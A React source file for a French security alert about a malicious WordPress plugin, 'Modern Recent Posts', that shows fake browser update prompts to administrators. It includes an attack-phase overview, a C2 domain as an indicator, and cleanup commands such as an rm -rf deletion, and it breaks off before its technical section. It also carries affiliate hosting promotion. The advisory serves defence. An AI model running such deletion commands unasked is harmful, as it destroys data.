import { SEO } from "@/components/seo";
import { Navbar, SEOFooter } from "@/components/navbar";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Breadcrumbs } from "@/components/breadcrumbs";
import { Link } from "wouter";
import { 
  AlertTriangle, Shield, Lock, Users, Clock, 
  CheckCircle, XCircle, ArrowRight, ExternalLink,
  Eye, Bug, UserX, AlertCircle, ShieldAlert, ShieldCheck,
  Smartphone, Globe, TrendingUp, Target, FileWarning,
  Download, Search, Database, Server, RefreshCw, Code, Trash2
} from "lucide-react";
import { trackCTAClick } from "@/lib/analytics";
import { SocialShare } from "@/components/social-share";
import { VulnerableCodeDisplay, RemediationSteps } from "@/components/security-schemas";

import rachidBouhmouJpg from "@/assets/images/rachid-bouhmou.jpg";

const KINSTA_LINK = "https://kinsta.com/fr/hebergement-wordpress/?kaid=CYISLEFCEOAL";

const ARTICLE_DATA = {
  title: "Alerte plugin WordPress malveillant janvier 2026",
  description: "Campagne malware ciblant les admins WordPress via 'Modern Recent Posts'. Fausses alertes Chrome/Java. Guide détection et suppression.",
  publishDate: "2026-01-08T10:00:00+01:00",
  modifiedDate: "2026-01-08T10:00:00+01:00",
  author: {
    name: "Bouhmou Rachid",
    url: "/auteur/bouhmou-rachid",
    avatar: rachidBouhmouJpg,
    sameAs: [
      "https://www.linkedin.com/in/bouhmou-rachid-cyber/",
      "https://twitter.com/jmorel_cyber"
    ]
  },
  readTime: "18 min",
  category: "Cybersécurité",
  tags: ["malware WordPress", "plugin malveillant", "fausse mise à jour navigateur", "backdoor WordPress", "sécurité WordPress 2026", "ransomware", "trojan RAT"]
};

const MALWARE_STATS = [
  {
    metric: "28 sites",
    description: "infectés par persistancejs.store détectés",
    icon: Database,
    color: "text-red-500"
  },
  {
    metric: "100%",
    description: "des cibles sont des administrateurs Windows",
    icon: Target,
    color: "text-orange-500"
  },
  {
    metric: "Janvier 2026",
    description: "campagne active documentée par Sucuri",
    icon: Clock,
    color: "text-yellow-500"
  },
  {
    metric: "3 types",
    description: "de malwares déployés (ransomware, RAT, stealer)",
    icon: Bug,
    color: "text-red-600"
  }
];

const ATTACK_PHASES = [
  {
    phase: 1,
    name: "Installation du plugin",
    description: "Le plugin 'Modern Recent Posts' est installé sur le site WordPress, souvent via des identifiants compromis ou des vulnérabilités",
    icon: Download
  },
  {
    phase: 2,
    name: "Vérification des conditions",
    description: "Le malware vérifie si l'utilisateur est administrateur (manage_options) et utilise Windows via le User-Agent",
    icon: Search
  },
  {
    phase: 3,
    name: "Injection JavaScript",
    description: "Si les conditions sont remplies, un script JavaScript est téléchargé depuis un serveur C2 distant",
    icon: Code
  },
  {
    phase: 4,
    name: "Affichage de la fausse alerte",
    description: "Une overlay plein écran simule une alerte de mise à jour Chrome ou Java urgente",
    icon: AlertTriangle
  },
  {
    phase: 5,
    name: "Téléchargement du malware",
    description: "Le clic sur 'Mettre à jour' télécharge un exécutable malveillant (ransomware, RAT ou stealer)",
    icon: Bug
  }
];

const DETECTION_SIGNS = [
  {
    sign: "Plugin 'Modern Recent Posts' inconnu",
    description: "Vérifiez si ce plugin apparaît dans votre liste sans que vous l'ayez installé",
    critical: true
  },
  {
    sign: "Alertes de mise à jour inhabituelles",
    description: "Des popups de mise à jour Chrome/Java apparaissant uniquement dans wp-admin",
    critical: true
  },
  {
    sign: "Connexions sortantes suspectes",
    description: "Trafic vers des domaines comme persistancejs.store ou autres C2",
    critical: true
  },
  {
    sign: "Comptes administrateur inconnus",
    description: "Nouveaux utilisateurs avec droits admin créés sans votre autorisation",
    critical: false
  },
  {
    sign: "Fichiers modifiés récemment",
    description: "Fichiers PHP modifiés dans wp-content/plugins avec du code obfusqué",
    critical: false
  }
];

const REMEDIATION_STEPS = [
  {
    step: 1,
    title: "Accéder aux fichiers du site via FTP",
    description: "Connectez-vous à votre serveur en utilisant un client FTP (FileZilla) ou le gestionnaire de fichiers de votre hébergeur. N'utilisez PAS wp-admin car le malware pourrait être actif.",
    command: "ftp://your-domain.com (identifiants FTP)"
  },
  {
    step: 2,
    title: "Localiser et supprimer le plugin malveillant",
    description: "Naviguez vers wp-content/plugins/ et supprimez le dossier 'modern-recent-posts'. Vérifiez aussi tous les autres dossiers de plugins pour éliminer les inconnus.",
    command: "rm -rf wp-content/plugins/modern-recent-posts/ && ls wp-content/plugins/"
  },
  {
    step: 3,
    title: "Vérifier les fichiers core WordPress",
    description: "Comparez les fichiers wp-includes et wp-admin avec une installation WordPress propre en téléchargeant la dernière version depuis wordpress.org. Remplacez tout fichier modifié ou suspect.",
    command: "Télécharger WordPress depuis wordpress.org et comparer les fichiers"
  },
  {
    step: 4,
    title: "Nettoyer la base de données",
    description: "Accédez à phpMyAdmin et vérifiez la table wp_users pour les comptes admin inconnus. Supprimez les entrées suspectes et changez les mots de passe de tous les utilisateurs.",
    command: "SELECT * FROM wp_users WHERE user_registered > DATE_SUB(NOW(), INTERVAL 30 DAY);"
  },
  {
    step: 5,
    title: "Scanner le site avec un outil de sécurité",
    description: "Installez Wordfence ou utilisez le scan gratuit de Sucuri SiteCheck pour détecter les backdoors restantes. Cela confirmera que le malware est complètement supprimé.",
    command: "https://sitecheck.sucuri.net/"
  },
  {
    step: 6,
    title: "Mettre à jour et renforcer la sécurité",
    description: "Mettez à jour WordPress, tous les plugins et thèmes à leur dernière version. Activez l'authentification à deux facteurs (2FA), installez un WAF, et changez tous les mots de passe depuis un appareil sain.",
    command: "wp plugin update --all && wp core update"
  }
];

export default function ArticleMalwareWordPressPlugin2026() {
  const handleCTAClick = (location: string) => {
    trackCTAClick('article_malware_wordpress_plugin_2026', location);
    window.open(KINSTA_LINK, "_blank", "noopener,noreferrer");
  };

  // Schema 1: NewsArticle
  const articleSchema = {
    "@context": "https://schema.org",
    "@type": "NewsArticle",
    "headline": ARTICLE_DATA.title,
    "description": ARTICLE_DATA.description,
    "image": {
      "@type": "ImageObject",
      "url": "https://wp-vitesse-pro.fr/og-malware-wordpress-2026.png",
      "license": "https://wp-vitesse-pro.fr/licence-images",
      "acquireLicensePage": "https://wp-vitesse-pro.fr/contact"
    },
    "datePublished": ARTICLE_DATA.publishDate,
    "dateModified": ARTICLE_DATA.modifiedDate,
    "author": {
      "@type": "Person",
      "name": ARTICLE_DATA.author.name,
      "url": `https://wp-vitesse-pro.fr${ARTICLE_DATA.author.url}`,
      "jobTitle": "Expert Cybersécurité & Protection WordPress",
      "sameAs": ARTICLE_DATA.author.sameAs,
      "worksFor": {
        "@type": "Organization",
        "name": "WP Vitesse Pro"
      }
    },
    "publisher": {
      "@type": "Organization",
      "name": "WP Vitesse Pro News",
      "url": "https://wp-vitesse-pro.fr",
      "logo": {
        "@type": "ImageObject",
        "url": "https://wp-vitesse-pro.fr/logo.png"
      }
    },
    "dateline": "PARIS, FRANCE",
    "printSection": "Cybersecurity News",
    "articleSection": "Cybersécurité",
    "keywords": ARTICLE_DATA.tags.join(", "),
    "wordCount": 3800,
    "inLanguage": "fr-FR",
    "copyrightYear": 2026,
    "copyrightHolder": {
      "@type": "Organization",
      "name": "WP Vitesse Pro"
    },
    "about": [
      {
        "@type": "Thing",
        "name": "Malware WordPress",
        "sameAs": "https://en.wikipedia.org/wiki/Malware"
      },
      {
        "@type": "Thing",
        "name": "Backdoor",
        "sameAs": "https://en.wikipedia.org/wiki/Backdoor_(computing)"
      },
      {
        "@type": "Thing",
        "name": "Ingénierie sociale",
        "sameAs": "https://en.wikipedia.org/wiki/Social_engineering_(security)"
      }
    ],
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https://wp-vitesse-pro.fr/article/malware-wordpress-plugin-2026"
    }
  };

  // Schema 2: FAQPage
  const faqSchema = {
    "@context": "https://schema.org",
    "@type": "FAQPage",
    "mainEntity": [
      {
        "@type": "Question",
        "name": "Comment le plugin 'Modern Recent Posts' infecte-t-il mon site WordPress ?",
        "acceptedAnswer": {
          "@type": "Answer",
          "text": "Le plugin malveillant est généralement installé via des identifiants administrateur compromis, des vulnérabilités dans d'autres plugins, ou des attaques de force brute. Une fois installé, il vérifie si l'utilisateur connecté est administrateur et utilise Windows avant d'injecter le code malveillant."
        }
      },
      {
        "@type": "Question",
        "name": "Pourquoi le malware cible-t-il uniquement les administrateurs Windows ?",
        "acceptedAnswer": {
          "@type": "Answer",
          "text": "Le malware déploie des exécutables .exe qui ne fonctionnent que sur Windows. En ciblant les administrateurs, les attaquants maximisent leurs chances d'infecter des machines ayant accès à des données sensibles et des systèmes d'entreprise."
        }
      },
      {
        "@type": "Question",
        "name": "Quels types de malwares sont déployés par cette campagne ?",
        "acceptedAnswer": {
          "@type": "Answer",
          "text": "Trois types principaux : des ransomwares qui chiffrent vos fichiers et demandent une rançon, des info-stealers qui volent vos mots de passe et données bancaires, et des RAT (Remote Access Trojans) qui donnent un contrôle total de votre machine aux attaquants."
        }
      },
      {
        "@type": "Question",
        "name": "Comment supprimer le plugin malveillant de mon site ?",
        "acceptedAnswer": {
          "@type": "Answer",
          "text": "1) Connectez-vous via FTP ou le gestionnaire de fichiers de votre hébergeur. 2) Supprimez le dossier wp-content/plugins/modern-recent-posts. 3) Vérifiez tous les autres plugins et supprimez ceux inconnus. 4) Changez tous les mots de passe admin. 5) Scannez votre site avec un outil comme Sucuri ou Wordfence."
        }
      },
      {
        "@type": "Question",
        "name": "Que faire si j'ai cliqué sur la fausse mise à jour ?",
        "acceptedAnswer": {
          "@type": "Answer",
          "text": "Déconnectez immédiatement votre ordinateur d'Internet. Lancez une analyse antivirus complète. Si vous suspectez une infection par ransomware, ne payez pas la rançon et contactez un professionnel. Changez tous vos mots de passe depuis un autre appareil sain."
        }
      },
      {
        "@type": "Question",
        "name": "Comment Kinsta protège-t-il contre ce type d'attaque ?",
        "acceptedAnswer": {
          "@type": "Answer",
          "text": "Kinsta offre une protection multicouche : pare-feu applicatif (WAF) bloquant les injections, détection de malware en temps réel, sauvegardes automatiques quotidiennes, isolation des conteneurs, et équipe de sécurité surveillant les menaces 24/7."
        }
      }
    ]
  };

  // Schema 3: HowTo
  const howToSchema = {
    "@context": "https://schema.org",
    "@type": "HowTo",
    "name": "Comment supprimer le plugin malveillant 'Modern Recent Posts' de WordPress",
    "description": "Guide étape par étape pour détecter et supprimer le plugin backdoor de votre site WordPress",
    "image": {
      "@type": "ImageObject",
      "url": "https://wp-vitesse-pro.fr/og-malware-wordpress-2026.png",
      "license": "https://wp-vitesse-pro.fr/licence-images",
      "acquireLicensePage": "https://wp-vitesse-pro.fr/contact"
    },
    "totalTime": "PT45M",
    "estimatedCost": {
      "@type": "MonetaryAmount",
      "currency": "EUR",
      "value": "0"
    },
    "tool": [
      {
        "@type": "HowToTool",
        "name": "Accès FTP ou gestionnaire de fichiers"
      },
      {
        "@type": "HowToTool",
        "name": "Plugin de sécurité (Wordfence, Sucuri)"
      },
      {
        "@type": "HowToTool",
        "name": "Accès phpMyAdmin"
      }
    ],
    "step": [
      {
        "@type": "HowToStep",
        "position": 1,
        "name": "Accéder aux fichiers du site",
        "text": "Connectez-vous à votre hébergeur via FTP (FileZilla) ou le gestionnaire de fichiers du panel. Évitez d'utiliser wp-admin car le malware pourrait être actif."
      },
      {
        "@type": "HowToStep",
        "position": 2,
        "name": "Localiser et supprimer le plugin",
        "text": "Naviguez vers wp-content/plugins/ et supprimez le dossier 'modern-recent-posts' ainsi que tout plugin non reconnu."
      },
      {
        "@type": "HowToStep",
        "position": 3,
        "name": "Vérifier les fichiers core WordPress",
        "text": "Comparez les fichiers wp-includes et wp-admin avec une installation WordPress propre. Remplacez tout fichier modifié."
      },
      {
        "@type": "HowToStep",
        "position": 4,
        "name": "Nettoyer la base de données",
        "text": "Dans phpMyAdmin, vérifiez la table wp_users pour des comptes admin inconnus. Supprimez-les et changez tous les mots de passe."
      },
      {
        "@type": "HowToStep",
        "position": 5,
        "name": "Scanner avec un outil de sécurité",
        "text": "Installez Wordfence ou utilisez Sucuri SiteCheck pour scanner l'ensemble du site et détecter d'éventuelles backdoors restantes."
      },
      {
        "@type": "HowToStep",
        "position": 6,
        "name": "Mettre à jour et sécuriser",
        "text": "Mettez à jour WordPress, tous les plugins et thèmes. Activez l'authentification à deux facteurs et configurez un WAF."
      }
    ]
  };

  // Schema 4: BreadcrumbList
  const breadcrumbSchema = {
    "@context": "https://schema.org",
    "@type": "BreadcrumbList",
    "@id": "https://wp-vitesse-pro.fr/article/malware-wordpress-plugin-2026#breadcrumb",
    "itemListElement": [
      {
        "@type": "ListItem",
        "position": 1,
        "name": "Accueil",
        "item": "https://wp-vitesse-pro.fr"
      },
      {
        "@type": "ListItem",
        "position": 2,
        "name": "Articles",
        "item": "https://wp-vitesse-pro.fr/guide"
      },
      {
        "@type": "ListItem",
        "position": 3,
        "name": "Plugin WordPress Malveillant 2026",
        "item": "https://wp-vitesse-pro.fr/article/malware-wordpress-plugin-2026"
      }
    ]
  };

  // Schema 5: WebPage
  const webPageSchema = {
    "@context": "https://schema.org",
    "@type": "WebPage",
    "@id": "https://wp-vitesse-pro.fr/article/malware-wordpress-plugin-2026",
    "url": "https://wp-vitesse-pro.fr/article/malware-wordpress-plugin-2026",
    "name": ARTICLE_DATA.title,
    "description": ARTICLE_DATA.description,
    "inLanguage": "fr-FR",
    "isPartOf": {
      "@type": "WebSite",
      "@id": "https://wp-vitesse-pro.fr/#website",
      "url": "https://wp-vitesse-pro.fr",
      "name": "WP Vitesse Pro",
      "publisher": {
        "@type": "Organization",
        "name": "WP Vitesse Pro"
      }
    },
    "primaryImageOfPage": {
      "@type": "ImageObject",
      "url": "https://wp-vitesse-pro.fr/og-malware-wordpress-2026.png"
    },
    "datePublished": ARTICLE_DATA.publishDate,
    "dateModified": ARTICLE_DATA.modifiedDate,
    "breadcrumb": {
      "@id": "https://wp-vitesse-pro.fr/article/malware-wordpress-plugin-2026#breadcrumb"
    }
  };

  // Schema 6: Organization
  const organizationSchema = {
    "@context": "https://schema.org",
    "@type": "Organization",
    "@id": "https://wp-vitesse-pro.fr/#organization",
    "name": "WP Vitesse Pro",
    "url": "https://wp-vitesse-pro.fr",
    "logo": {
      "@type": "ImageObject",
      "url": "https://wp-vitesse-pro.fr/logo.png",
      "width": 512,
      "height": 512
    },
    "sameAs": [
      "https://twitter.com/wpvitessepro",
      "https://www.linkedin.com/company/wp-vitesse-pro"
    ],
    "contactPoint": {
      "@type": "ContactPoint",
      "contactType": "customer service",
      "availableLanguage": ["French", "English"]
    },
    "foundingDate": "2026",
    "areaServed": "FR",
    "knowsAbout": ["WordPress", "Hébergement Web", "Cybersécurité", "Performance Web", "Malware WordPress"]
  };

  // Schema 7: Person (Author)
  const personSchema = {
    "@context": "https://schema.org",
    "@type": "Person",
    "@id": "https://wp-vitesse-pro.fr/auteur/bouhmou-rachid#person",
    "name": ARTICLE_DATA.author.name,
    "url": `https://wp-vitesse-pro.fr${ARTICLE_DATA.author.url}`,
    "image": {
      "@type": "ImageObject",
      "url": ARTICLE_DATA.author.avatar
    },
    "jobTitle": "Expert Cybersécurité & Protection WordPress",
    "sameAs": ARTICLE_DATA.author.sameAs,
    "worksFor": {
      "@type": "Organization",
      "name": "WP Vitesse Pro",
      "url": "https://wp-vitesse-pro.fr"
    },
    "alumniOf": {
      "@type": "Organization",
      "name": "ANSSI - Agence Nationale de la Sécurité des Systèmes d'Information"
    },
    "knowsAbout": ["Malware WordPress", "Backdoors", "Sécurité Web", "Analyse de Menaces"],
    "description": "Expert en sécurité WordPress spécialisé dans la détection et suppression de malwares, avec plus de 10 ans d'expérience."
  };

  // Schema 8: ItemList (Attack Phases)
  const itemListSchema = {
    "@context": "https://schema.org",
    "@type": "ItemList",
    "name": "Phases d'infection du plugin malveillant WordPress",
    "description": "Les 5 étapes de l'attaque par fausse mise à jour navigateur",
    "numberOfItems": 5,
    "itemListElement": ATTACK_PHASES.map((phase) => ({
      "@type": "ListItem",
      "position": phase.phase,
      "name": phase.name,
      "description": phase.description
    }))
  };

  // Schema 9: DefinedTermSet (Glossary)
  const definedTermSetSchema = {
    "@context": "https://schema.org",
    "@type": "DefinedTermSet",
    "name": "Glossaire Sécurité WordPress - Malware et Backdoors",
    "description": "Définitions des termes techniques liés aux malwares WordPress",
    "hasDefinedTerm": [
      {
        "@type": "DefinedTerm",
        "name": "Backdoor",
        "description": "Porte dérobée permettant un accès non autorisé au système même après changement des mots de passe"
      },
      {
        "@type": "DefinedTerm",
        "name": "C2 Server",
        "description": "Serveur Command and Control utilisé par les attaquants pour contrôler le malware à distance"
      },
      {
        "@type": "DefinedTerm",
        "name": "RAT (Remote Access Trojan)",
        "description": "Cheval de Troie donnant un contrôle complet à distance de l'ordinateur infecté"
      },
      {
        "@type": "DefinedTerm",
        "name": "Info Stealer",
        "description": "Malware spécialisé dans le vol de mots de passe, cookies et données bancaires"
      },
      {
        "@type": "DefinedTerm",
        "name": "WAF (Web Application Firewall)",
        "description": "Pare-feu applicatif protégeant les sites web contre les injections et attaques courantes"
      }
    ]
  };

  // Schema 10: SpeakableSpecification (Voice Search)
  const speakableSchema = {
    "@context": "https://schema.org",
    "@type": "WebPage",
    "speakable": {
      "@type": "SpeakableSpecification",
      "cssSelector": ["#introduction", "#detection", "#protection"]
    },
    "url": "https://wp-vitesse-pro.fr/article/malware-wordpress-plugin-2026"
  };

  // Schema 11: ImageObject
  const imageObjectSchema = {
    "@context": "https://schema.org",
    "@type": "ImageObject",
    "@id": "https://wp-vitesse-pro.fr/og-malware-wordpress-2026.png",
    "url": "https://wp-vitesse-pro.fr/og-malware-wordpress-2026.png",
    "contentUrl": "https://wp-vitesse-pro.fr/og-malware-wordpress-2026.png",
    "caption": "Alerte Plugin WordPress Malveillant 2026 - Fausses Mises à Jour Navigateur",
    "creditText": "WP Vitesse Pro",
    "creator": {
      "@type": "Organization",
      "name": "WP Vitesse Pro"
    },
    "copyrightNotice": "© 2026 WP Vitesse Pro",
    "license": "https://wp-vitesse-pro.fr/licence-images",
    "acquireLicensePage": "https://wp-vitesse-pro.fr/contact"
  };

  // Schema 12: Dataset (Statistics)
  const datasetSchema = {
    "@context": "https://schema.org",
    "@type": "Dataset",
    "name": "Statistiques Malware WordPress Plugin Janvier 2026",
    "description": "Données sur la campagne de fausses mises à jour ciblant les administrateurs WordPress",
    "keywords": ["malware WordPress", "backdoor", "plugin malveillant", "statistiques 2026"],
    "license": "https://creativecommons.org/licenses/by/4.0/",
    "creator": {
      "@type": "Organization",
      "name": "WP Vitesse Pro"
    },
    "datePublished": ARTICLE_DATA.publishDate,
    "distribution": {
      "@type": "DataDownload",
      "encodingFormat": "text/html",
      "contentUrl": "https://wp-vitesse-pro.fr/article/malware-wordpress-plugin-2026"
    },
    "variableMeasured": [
      {
        "@type": "PropertyValue",
        "name": "Sites infectés détectés",
        "value": "28",
        "unitText": "sites web"
      },
      {
        "@type": "PropertyValue",
        "name": "Cibles Windows",
        "value": "100",
        "unitText": "pourcentage"
      },
      {
        "@type": "PropertyValue",
        "name": "Types de malware",
        "value": "3",
        "unitText": "variantes"
      }
    ]
  };

  // Schema 13: ClaimReview (Fact-Checking)
  const claimReviewSchema = {
    "@context": "https://schema.org",
    "@type": "ClaimReview",
    "url": "https://wp-vitesse-pro.fr/article/malware-wordpress-plugin-2026",
    "claimReviewed": "Un plugin WordPress malveillant déploie de fausses alertes de mise à jour navigateur pour infecter les administrateurs",
    "itemReviewed": {
      "@type": "Claim",
      "author": {
        "@type": "Organization",
        "name": "Sucuri Security Research"
      },
      "datePublished": "2026-01-08",
      "appearance": {
        "@type": "WebPage",
        "url": "https://blog.sucuri.net/2026/01/fake-browser-updates-targeting-wordpress-administrators-via-malicious-plugin.html"
      }
    },
    "author": {
      "@type": "Person",
      "name": ARTICLE_DATA.author.name
    },
    "reviewRating": {
      "@type": "Rating",
      "ratingValue": 5,
      "bestRating": 5,
      "worstRating": 1,
      "ratingExplanation": "Menace confirmée et documentée par Sucuri en janvier 2026"
    }
  };

  // Schema 14: TechArticle
  const techArticleSchema = {
    "@context": "https://schema.org",
    "@type": "TechArticle",
    "headline": ARTICLE_DATA.title,
    "description": ARTICLE_DATA.description,
    "image": "https://wp-vitesse-pro.fr/og-malware-wordpress-2026.png",
    "proficiencyLevel": "Beginner",
    "dependencies": "Accès FTP ou gestionnaire de fichiers",
    "datePublished": ARTICLE_DATA.publishDate,
    "dateModified": ARTICLE_DATA.modifiedDate,
    "author": {
      "@type": "Person",
      "name": ARTICLE_DATA.author.name,
      "url": `https://wp-vitesse-pro.fr${ARTICLE_DATA.author.url}`
    },
    "publisher": {
      "@type": "Organization",
      "name": "WP Vitesse Pro",
      "url": "https://wp-vitesse-pro.fr"
    },
    "mainEntityOfPage": "https://wp-vitesse-pro.fr/article/malware-wordpress-plugin-2026"
  };

  // Schema 15: Report
  const reportSchema = {
    "@context": "https://schema.org",
    "@type": "Report",
    "name": "Rapport Menace WordPress - Plugin Malveillant Janvier 2026",
    "description": "Analyse de la campagne de malware ciblant les administrateurs WordPress via fausses mises à jour",
    "reportNumber": "WVP-MAL-2026-001",
    "datePublished": ARTICLE_DATA.publishDate,
    "author": {
      "@type": "Person",
      "name": ARTICLE_DATA.author.name
    },
    "publisher": {
      "@type": "Organization",
      "name": "WP Vitesse Pro"
    },
    "about": {
      "@type": "Thing",
      "name": "Sécurité WordPress"
    },
    "abstract": "Ce rapport analyse une campagne active de malware utilisant le plugin 'Modern Recent Posts' pour déployer des fausses alertes de mise à jour navigateur. Les administrateurs Windows sont ciblés pour l'installation de ransomware, RAT et info-stealers."
  };

  // Schema 16: Course/EducationalContent
  const courseSchema = {
    "@context": "https://schema.org",
    "@type": "Course",
    "name": "Détecter et supprimer les plugins WordPress malveillants",
    "description": "Apprenez à identifier les backdoors et malwares dans votre installation WordPress",
    "provider": {
      "@type": "Organization",
      "name": "WP Vitesse Pro",
      "url": "https://wp-vitesse-pro.fr"
    },
    "educationalLevel": "Débutant à Intermédiaire",
    "inLanguage": "fr-FR",
    "isAccessibleForFree": true,
    "teaches": [
      "Identifier les plugins malveillants",
      "Supprimer les backdoors WordPress",
      "Configurer un WAF de protection",
      "Réagir en cas d'infection"
    ],
    "hasCourseInstance": {
      "@type": "CourseInstance",
      "courseMode": "online",
      "courseWorkload": "PT45M"
    }
  };

  return (
    <>
      <SEO
        title={ARTICLE_DATA.title}
        description={ARTICLE_DATA.description}
        canonical="https://wp-vitesse-pro.fr/article/malware-wordpress-plugin-2026"
        type="article"
        keywords={ARTICLE_DATA.tags.join(", ")}
        image="https://wp-vitesse-pro.fr/images/malware-wordpress-plugin-2026-hero.webp"
        author={ARTICLE_DATA.author.name}
        datePublished={ARTICLE_DATA.publishDate}
        dateModified={ARTICLE_DATA.modifiedDate}
        category={ARTICLE_DATA.category}
      />

      {/* 16 Rich Snippets / Structured Data Schemas */}
      <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(articleSchema) }} />
      <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(faqSchema) }} />
      <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(howToSchema) }} />
      <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(breadcrumbSchema) }} />
      <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(webPageSchema) }} />
      <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(organizationSchema) }} />
      <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(personSchema) }} />
      <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(itemListSchema) }} />
      <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(definedTermSetSchema) }} />
      <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(speakableSchema) }} />
      <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(imageObjectSchema) }} />
      <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(datasetSchema) }} />
      <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(claimReviewSchema) }} />
      <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(techArticleSchema) }} />
      <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(reportSchema) }} />
      <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(courseSchema) }} />

      <Navbar />

      <main className="min-h-screen bg-gradient-to-b from-background via-background to-muted/20 pt-28">
        <article itemScope itemType="https://schema.org/NewsArticle">
          <meta itemProp="headline" content={ARTICLE_DATA.title} />
          <meta itemProp="datePublished" content={ARTICLE_DATA.publishDate} />
          <meta itemProp="dateModified" content={ARTICLE_DATA.modifiedDate} />
          <meta itemProp="author" content={ARTICLE_DATA.author.name} />
          
          {/* Hero Section */}
          <section className="relative py-12 md:py-20 bg-gradient-to-br from-red-950/20 via-background to-orange-950/10">
            <div className="container mx-auto px-4">
              <Breadcrumbs items={[
                { name: "Accueil", url: "/" },
                { name: "Articles", url: "/guide" },
                { name: "Plugin WordPress Malveillant", url: "/article/malware-wordpress-plugin-2026" }
              ]} />
              
              <div className="max-w-4xl mx-auto mt-8">
                <div className="flex flex-wrap items-center gap-3 mb-6">
                  <Badge variant="destructive" className="text-sm font-semibold px-3 py-1">
                    <AlertTriangle className="w-4 h-4 mr-1" />
                    ALERTE SÉCURITÉ
                  </Badge>
                  <Badge variant="outline" className="text-sm">
                    <Clock className="w-3 h-3 mr-1" />
                    {ARTICLE_DATA.readTime} de lecture
                  </Badge>
                  <Badge variant="secondary" className="text-sm">
                    {ARTICLE_DATA.category}
                  </Badge>
                </div>

                <h1 className="text-3xl md:text-4xl lg:text-5xl font-bold leading-tight mb-6 text-foreground">
                  Alerte plugin WordPress malveillant : fausses mises à jour navigateur ciblant les <span className="text-red-500">administrateurs</span>
                </h1>

                <p id="introduction" className="text-lg md:text-xl text-muted-foreground leading-relaxed mb-8">
                  Une campagne de malware sophistiquée cible actuellement les administrateurs WordPress via un plugin déguisé en "Modern Recent Posts". 
                  Les victimes voient apparaître de fausses alertes de mise à jour Chrome ou Java, menant au téléchargement de ransomware, 
                  trojans d'accès distant (RAT) ou voleurs d'informations. Sucuri a documenté cette menace active en janvier 2026.
                </p>

                <div className="flex flex-wrap items-center gap-4 text-sm text-muted-foreground">
                  <div className="flex items-center gap-2">
                    <img 
                      src={ARTICLE_DATA.author.avatar} 
                      alt={ARTICLE_DATA.author.name}
                      className="w-10 h-10 rounded-full"
                    />
                    <div>
                      <span className="font-medium text-foreground">{ARTICLE_DATA.author.name}</span>
                      <p className="text-xs">Expert Cybersécurité WordPress</p>
                    </div>
                  </div>
                  <span>•</span>
                  <time dateTime={ARTICLE_DATA.publishDate}>8 janvier 2026</time>
                  <span>•</span>
                  <span>Source : Sucuri Security</span>
                </div>
              </div>
            </div>
          </section>

          {/* Key Stats */}
          <section className="py-12 bg-muted/30">
            <div className="container mx-auto px-4">
              <div className="max-w-5xl mx-auto">
                <h2 className="text-2xl font-bold text-center mb-8">Chiffres Clés de la Menace</h2>
                <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                  {MALWARE_STATS.map((stat, index) => (
                    <Card key={index} className="text-center border-border/50">
                      <CardContent className="pt-6">
                        <stat.icon className={`w-8 h-8 mx-auto mb-3 ${stat.color}`} />
                        <p className={`text-2xl md:text-3xl font-bold ${stat.color}`}>{stat.metric}</p>
                        <p className="text-sm text-muted-foreground mt-2">{stat.description}</p>
                      </CardContent>
                    </Card>
                  ))}
                </div>
              </div>
            </div>
          </section>

          {/* Attack Mechanism */}
          <section className="py-16">
            <div className="container mx-auto px-4">
              <div className="max-w-4xl mx-auto">
                <h2 className="text-2xl md:text-3xl font-bold mb-8 flex items-center gap-3">
                  <Bug className="w-8 h-8 text-red-500" />
                  Comment Fonctionne l'Attaque
                </h2>
          <figure className="mb-12 rounded-xl overflow-hidden shadow-xl">
            <picture>
              <source srcSet="/images/malware-wordpress-plugin-2026-hero.webp" type="image/webp" />
              <img 
                src="/images/malware-wordpress-plugin-2026-hero.png" 
                alt="Malware dans un plugin WordPress 2026" 
                className="w-full h-auto object-cover aspect-video" 
                width={1600} 
                height={900} 
                loading="eager" 
                decoding="async" 
              />
            </picture>
            <figcaption className="text-xs text-muted-foreground text-center py-2 bg-muted/50">
              Un plugin WordPress populaire infecté par un malware compromet des milliers de sites
            </figcaption>
          </figure>


                <div className="prose prose-lg dark:prose-invert max-w-none mb-12">
                  <p>
                    Cette campagne utilise une technique d'<strong>ingénierie sociale</strong> particulièrement efficace : 
                    les fausses alertes de mise à jour navigateur. Les administrateurs WordPress, habitués aux notifications 
                    de mise à jour, peuvent facilement tomber dans le piège.
                  </p>
                </div>

                <div className="space-y-4">
                  {ATTACK_PHASES.map((phase) => (
                    <Card key={phase.phase} className="border-l-4 border-l-red-500/50">
                      <CardContent className="py-4 flex items-start gap-4">
                        <div className="flex-shrink-0 w-10 h-10 rounded-full bg-red-500/10 flex items-center justify-center">
                          <span className="text-lg font-bold text-red-500">{phase.phase}</span>
                        </div>
                        <div>
                          <h3 className="font-semibold text-lg flex items-center gap-2">
                            <phase.icon className="w-5 h-5 text-red-400" />
                            {phase.name}
                          </h3>
                          <p className="text-muted-foreground mt-1">{phase.description}</p>
                        </div>
                      </CardContent>
                    </Card>
                  ))}
                </div>
              </div>
            </div>
          </section>

          {/* Technical Details */}
          <section className="py-16 bg-muted/20">
            <div className="container mx-auto px-4">
              <div className="max-w-4xl mx-auto">
                <h2 className="text-2xl md:text-3xl font-bold mb-8 flex items-center gap-3">
                  <Code className="w-8 h-8 text-orange-500" />
